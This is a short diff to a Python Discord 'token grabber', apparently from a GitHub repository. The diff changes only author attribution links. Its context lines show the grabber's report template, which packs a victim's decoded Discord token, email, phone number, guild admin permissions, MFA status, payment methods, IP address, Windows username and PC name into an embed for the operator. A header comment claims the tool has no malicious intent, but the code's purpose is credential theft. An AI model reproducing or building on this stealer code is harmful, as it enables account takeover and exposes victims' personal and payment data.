@@ -1,4 +1,4 @@
-#hello token grabber made in "perseo47"
+#hello token grabber made in "perseo47" https://github.com/perseo47
 
 #this token grabber was not made with any malicious intent
 
@@ -227,7 +227,7 @@ def main():
                                 ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token_decoded}```""",
                             'color': 3092790,
                             'footer': {
-                                'text': "👨‍💻 https://github.com/pablo13312 ・👨‍💻 𝗯𝘆 𝗽𝗲𝗿𝘀𝗲𝗼47 "
+                                'text': "👨‍💻 https://github.com/perseo47 ・👨‍💻 𝗯𝘆 𝗽𝗲𝗿𝘀𝗲𝗼47 "
                             },
                             'thumbnail': {
                                 'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
